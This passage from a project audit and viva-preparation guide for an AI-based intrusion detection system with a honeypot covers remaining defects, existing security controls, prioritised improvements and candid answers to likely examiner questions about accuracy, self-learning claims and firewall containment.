| L12 | Root `models/` duplicate, plus 7 candidate models of which only one is used | `models/`, `ai-engine/models/` | Keep the active model plus its meta; move the rest to `experiments/`. |
| L13 | Hard-coded local path | `start-backend.ps1:2` | `Set-Location "$PSScriptRoot\backend"` |
| L14 | Mongo pool and timeout hard-coded | `config/db.js` | Environment overrides. |
| L15 | Seed Q-table provenance unknown | `ai-engine/models/q_table.json` | Regenerate from an all-zero table, or document where it came from. |

## Security posture: what is already good (say this in the viva)

- **Secrets:** startup refuses missing, short, placeholder or reused secrets (`validateEnv.js`).
  No secrets are committed (grep found none).
- **Auth:**
  - Short-lived access tokens with server-side session revocation.
  - Refresh token in an httpOnly `SameSite=strict` cookie.
  - HMAC CSRF on auth mutations.
  - Role re-check on sockets every 15 s and on every packet.
- **Injection:**
  - `express-mongo-sanitize` strips `$` and `.` keys from user input.
  - Regex input is escaped (`querySecurity.escapeRegex`).
  - ObjectIds are validated.
  - Body limit is 10 kb.
  - Pydantic rejects NaN and Inf.
- **CORS:** exact-origin allow-lists on both services; credentials only for those origins.
- **Containment safety:**
  - Protected ranges: loopback, link-local, multicast, `/0`, anything wider than `/24` (IPv4) or
    `/64` (IPv6), plus your own list.
  - Fail-closed adapter gates.
  - Allow-listed `netsh` arguments.
- **Privacy:**
  - Captured honeypot credentials are redacted before storage (`redactCapturedCredentials`).
  - Logs omit commands and URLs (the parser) and redact secrets (`utils/redact.js`).
- **Honeypot isolation:**
  - The honeypot host only needs the ingest key. The backend refuses to let that key record AI
    predictions (`aiEngineOnly`).
  - Cowrie is meant to run on a separate host.

---

# PHASE 5 — IMPROVEMENTS

## Quick wins (< 1 hour each)
| Item | Effort | Impact | Files |
|---|---|---|---|
| `load_dotenv` in AI engine (H7) | 5 min | High (startup reliability) | `ai-engine/inference/main.py` |
| Persist Q-table: set `SENTINEL_ALLOW_REPO_RUNTIME_WRITE=1`, save each episode (H6) | 15 min | High (RL claim) | `ai-engine/.env`, `rl_engine/deception_scorer.py` |
| Threshold cache back-off (H3) | 15 min | Medium | `backend/services/aiEngineService.js` |
| `execFile` in firewall adapter (H1) | 30 min | High (security story) | `WindowsFirewallAdapter.js` |
| Throttle `request_stats` (M4) | 10 min | Medium | `websocket/socketManager.js` |
| Delete `.bak`/`.orig`, duplicate scorer, root `models/` (L6, L7, L12) | 20 min | Medium (clarity for examiners) | repo |
| Fix `\bid\b` regex, unused `exec`, bare except (L1–L3) | 10 min | Low | collector, scorer |
| `model_config` migration (L11) | 10 min | Low | `main.py` |
| Remove dead env vars, document `SENTINEL_API_URL` (L8, L9) | 10 min | Low | `.env.example`, `honeypot/README.md` |

## Important fixes before demo/viva
| Item | Effort | Impact | Files |
|---|---|---|---|
| Re-evaluate the deployed RF on a day-held-out split; add macro F1 / per-class recall / FPR to README and paper (C1) | 3–4 h | **Critical** (credibility) | `ai-engine/evaluation/evaluate_model.py`, `README.md`, `paper_text.txt` |
| Add a demo driver that sends real CICIDS rows through `/api/ai/analyze` so the dashboard shows real detections (C2) | 1–2 h | High | `ai-engine/demo/replay_cicids.py` (`--target backend`) |
| Degraded-mode alert de-dup (H2) | 1 h | High (demo resilience) | `aiService.js`, `aiEngineService.js` |
| Run inference in a threadpool (H4) + locks (M5) | 1 h | Medium | `inference/main.py`, `inference/deception.py` |
| Atomic honeypot updates (M2) and the containment unique index (M1) | 2 h | Medium | `session_collector.js`, `models/ContainmentAction.js` |
| Event timestamps from Cowrie (M12) | 1 h | Medium | `log_parser.py`, `session_collector.js` |
| Relabel honeypot classification as rule-based in the UI (M8) | 30 min | Medium (honesty) | `frontend/src/pages/HoneypotAnalytics.jsx` |
| Model registry with sha256 pinning (M11) | 1–2 h | Medium | `predictor.py`, `models/registry.json` |

## Feature upgrades toward "self-evolving"
| Item | Effort | Impact | Files |
|---|---|---|---|
| **F1 Supervised retraining pipeline:** script that pulls `ELIGIBLE_FOR_TRAINING` TrainingSamples + base CICIDS, trains a candidate with `train.py`, evaluates on a fixed sealed hold-out, writes metrics. **Human-approved promotion** only. | 2–3 days | Very high (closes suspicion a) | new `ai-engine/training/retrain_from_samples.py`, `trainingSampleService.js` (export), `routes/trainingSamples.js` (`POST /retrain-requests`) |
| **F2 Model registry + hot reload:** `registry.json` lists versions with hash, metrics, schema; `POST /model/reload` (K-py) swaps the predictor atomically; `/model/info` shows the active version; rollback = point registry back | 1 day | High | `predictor.py`, `main.py`, `aiEngineService.js` |
| **F3 Real adaptive deception:** contextual bandit (state = attacker features such as login success, intent mix, hassh family) choosing the persona per new connection; apply it with a Cowrie per-session persona or by rotating profiles on a schedule; log reward per persona so Q values differ | 3–5 days | High (makes the RL claim true) | `rl_engine/deception_scorer.py`, `honeypot/switch_profile.py`, `honeypotService.js` |
| **F4 Drift detection:** keep per-feature reference stats (training scaler `mean_`/`var_` already exist); compute PSI / KS on the last N `AIPrediction.featureVector`s; alert when drift exceeds a threshold → triggers F1 | 1–2 days | High | new `ai-engine/monitoring/drift.py`, `GET /model/drift`, `socketManager` alert |
| **F5 Real firewall behind a safe toggle:** unify paths (M7); real adapter only on an isolated VM; require admin approval per action (two-person rule) plus auto-expiry (already in `calculateExpiration`) plus a dry-run preview; log `netsh` output to the ContainmentAction | 2 days + VM | Medium-high | `containmentService.js`, `WindowsFirewallAdapter.js`, `scripts/run-vm-firewall-tests.ps1` |
| **F6 Live flow detection:** sniffer → cicflowmeter → POST each completed flow to FastAPI `/predict` (callback) with backpressure | 2 days | High | `honeypot/sniffer/sniffer.py` |

## Production-readiness
| Item | Effort | Impact | Files |
|---|---|---|---|
| Docker Compose (mongo replica set, ai-engine, backend, frontend; Cowrie in its own network) with health checks on `/ready` and `/health` | 1 day | High | new `docker-compose.yml`, `ai-engine/Dockerfile`, `backend/Dockerfile` |
| Run the 4 skipped Mongo suites in CI with a Mongo service container (`AUTH_TEST_MONGO_URI`) | 1 h | Medium | `.github/workflows/ci.yml` |
| CI check that the deployed model hash matches the registry, plus a smoke `/predict/eval` | 1 h | Medium | `ci.yml`, `scripts/native_ai_smoke.py` |
| Structured JSON logs with request/correlation IDs across Node → FastAPI (`X-Request-Id`) | 4 h | Medium | `utils/logger.js`, `aiEngineService.js`, `main.py` logging |
| Metrics: Prometheus `/metrics` (inference latency, predictions by class, AI errors, socket clients) | 1 day | Medium | both services |
| Retries with jitter and a circuit breaker for Node → FastAPI | 2 h | Medium | `aiEngineService.js` |
| Persistent outbox (Mongo-backed `OutboxStore`) if the event bus is meant to matter | 1 day | Low-medium | `utils/securityEventBus.js` |
| Pin the Python interpreter (`.python-version` 3.11) and refuse to start on an sklearn version mismatch | 30 min | Medium | `ai-engine/`, `predictor.py` |

---

# PHASE 6 — VIVA PREP

## 15 likely questions, with honest answers

1. **Walk me through what happens when a threat is detected.**
   The backend posts the flow to FastAPI `/predict/internal`. FastAPI builds a 53-feature vector
   and runs a random forest (class) and an isolation forest (anomaly). It returns
   `threatScore = 0.7 × RF confidence + 0.3 × anomaly signal`. Node validates the score, picks an
   action against a 0.92 block threshold, stores an `AIPrediction`, and creates a `ThreatLog` if
   the score is at least 0.7. It then pushes `new_threat` and `ai_prediction` over Socket.IO to
   role-based rooms. Auto-block only happens if an admin has enabled `autoBlockEnabled`.

2. **Why split Node and Python?**
   Python owns the ML ecosystem (scikit-learn, XGBoost, SHAP). Node owns I/O-heavy work: auth,
   WebSockets and Mongo. They talk over authenticated HTTP. FastAPI loads the models once at
   startup, and the API can degrade safely if the AI service is down.

3. **What if the AI engine is down?**
   Calls time out after 10 s. Traffic is recorded as `UNINSPECTED_TRAFFIC` with status
   `UNAVAILABLE`, and it is never auto-blocked: degraded always means MONITOR. `/health` returns
   503. There are no retries yet, and I'd add a circuit breaker.

4. **How do you secure service-to-service calls?**
   Shared API keys in `X-API-Key`, compared in constant time. The honeypot and the AI engine use
   different keys, and the honeypot key cannot record AI predictions. Both services bind to
   localhost by default and refuse to start with missing or placeholder keys.

5. **How is user auth done?**
   Short-lived access JWTs (15 min), checked against a server-side session on every request and
   every socket packet. The refresh token is an httpOnly, SameSite-strict cookie, and auth
   mutations need an HMAC CSRF token. RBAC has three roles. Sessions can be revoked, which also
   disconnects that user's sockets.

6. **Your accuracy is 98.43%. How was it measured?**
   On CICIDS2017 with a stratified random 80/20 split, macro F1 0.84. Honestly, a random row split
   overstates real-world performance because flows from the same sessions appear on both sides. My
   own sealed-test audit of a leakage-free candidate still has GATE-1 open. The fair claim is
   "high in-distribution accuracy on CICIDS2017", not production accuracy.

7. **Did time-of-day leak into the model?**
   Not in the deployed artifact. I checked: the time features have zero variance and zero
   importance in every shipped model, so they never influenced a prediction. Leakage did appear in
   later multicorpus candidates, and the bigger issue is the random split plus CICIDS shortcut
   features such as initial window size.

8. **Why both a random forest and an isolation forest?**
   The RF recognises known attack classes. The IF flags unusual flows the RF calls benign, which
   become `Unknown` with score ≥ 0.55. That gives some coverage of unseen attacks without labels.

9. **Is the system really self-evolving?**
   Partially. At runtime only the deception Q-table learns. Supervised models are retrained
   offline with `train.py`. Analyst-verified predictions are collected as quarantined training
   samples, but there's no automated retraining loop yet. That's future work, with human-approved
   promotion.

10. **Explain the Q-learning.**
    States and actions are six honeypot personas. The reward comes from engagement: session
    duration, command count, malicious-intent bonuses, IOCs, and successful login. The update is
    the standard Q-learning rule with α 0.1, γ 0.9, ε-greedy with decay. Honestly, the deployed
    honeypot always serves CentOS 7 and the recommendation isn't applied automatically. So today it
    estimates the value of the active persona and recommends the next one, rather than adapting the
    honeypot.

11. **How does blocking work? Can it lock you out?**
    AI auto-blocks are off by default and write to a deny-list that the Cowrie blocker enforces.
    A separate containment API uses an adapter: mock by default, with the real Windows Firewall
    adapter behind two explicit environment gates. A policy engine refuses loopback, link-local,
    multicast, `/0`, CIDRs wider than `/24`, and operator-protected IPs. The real firewall adapter
    has not been run against a live host.

12. **How do you prevent command injection in the firewall adapter?**
    Targets are restricted to IP/CIDR characters and rule names to a fixed `SentinelAI-Rule-`
    namespace, and the gate is checked again on every call. I'd strengthen it by switching from
    `exec` to `execFile`, so no shell is involved at all.

13. **How do WebSockets stay secure?**
    The handshake requires a valid access token and an allowed origin. The server ignores the role
    the client claims and uses the verified one, putting viewers in redacted rooms. Sockets are
    re-authorised every 15 s and per packet, and are dropped at token expiry or revocation.

14. **How do you handle the honeypot's sensitive data?**
    Captured credentials are redacted before storage. Parser logs omit commands and URLs. The
    honeypot host only gets the ingest key, and Cowrie runs on a separate host.

15. **What would you do next?**
    - A day-held-out evaluation, and reporting macro F1.
    - A retraining pipeline with a model registry and drift detection.
    - Applying deception recommendations, so the RL truly adapts.
    - Unifying the deny-list with the containment adapter.
    - Docker Compose with health checks.

## 2-minute verbal explanation (memorise)

> SentinelAI has three services. A Node.js and Express gateway owns authentication, role-based
> access, the MongoDB data model and real-time Socket.IO updates. A Python FastAPI engine owns the
> machine learning. A Cowrie SSH honeypot is the deception layer.
>
> When a flow is analysed, Node sends it to FastAPI with an internal API key. FastAPI builds a
> 53-feature vector and runs a random forest trained on CICIDS2017 to name the attack type, plus an
> isolation forest to catch anomalies. It combines them into a threat score between 0 and 1. Node
> applies the decision policy: below 0.7 it's recorded, from 0.7 it becomes a threat and an alert,
> and from 0.92 it can be auto-blocked, but only if an administrator has enabled auto-block.
> Everything is stored in MongoDB and pushed live to role-specific dashboard rooms, with viewers
> getting redacted data.
>
> On the honeypot side, a parser tails Cowrie's JSON log and streams session events to the backend.
> When a session closes, the backend asks FastAPI to classify it and runs a Q-learning scorer. The
> scorer rewards personas that keep attackers engaged and recommends which persona to present next.
> Blocked IPs go into a deny-list that the honeypot enforces.
>
> Containment is safety-first. The default adapter is a mock, the real Windows Firewall adapter
> needs two explicit switches, and a policy engine refuses to block loopback, broad ranges or
> protected hosts.
>
> The system degrades safely: if the AI engine is down, traffic is held in monitor mode and never
> blocked. It is covered by about 950 backend tests and 335 AI-engine tests.

## Implemented vs mocked vs future work — exact wording

**Implemented and tested**
- Authenticated REST API and Socket.IO with RBAC, server-side sessions, CSRF and revocation.
- RF and IF inference service with SHAP explanations and fail-closed model validation.
- Threat, alert, prediction and honeypot persistence in MongoDB.
- Cowrie log ingestion with credential redaction.
- Rule-plus-model honeypot session classification.
- Tabular Q-learning deception scoring with persona recommendation.
- Deny-list auto-blocking (off by default) with a safety policy engine.
- Containment API with a mock adapter.
- Campaign clustering, analyst verification and training-sample quarantine.
- Retention (opt-in).

**Mocked, gated, or not verified live**
- Host firewall enforcement: the Windows adapter exists but is disabled by default and has never
  been run against a live host.
- Persona switching: recommended, not applied automatically.
- Real Cowrie deployment and the blocker plugin: not verified end to end in this environment.
- AbuseIPDB enrichment: needs a key.
- Shadow detectors: off by default and decision-neutral.

**Future work**
- Automated supervised retraining with a model registry and promotion approval.
- Drift detection.
- Live packet-to-detection streaming.
- Adaptive per-attacker deception.
- Unified deny-list and firewall containment.
- Containerised deployment with monitoring.
- Validation beyond CICIDS2017.

**Phrases to avoid → say instead**
- "Self-evolving AI" → "online reinforcement learning for deception, plus a human-in-the-loop path toward retraining".
- "98% accurate IDS" → "98.4% accuracy (macro F1 0.84) on a random CICIDS2017 split".
- "Autonomously blocks attackers on the firewall" → "can autonomously add attackers to a deny-list enforced by the honeypot; host firewall enforcement is implemented behind safety gates but not enabled".
- "Detects live network traffic" → "analyses flow records submitted to the API; live capture currently builds a labelled dataset".
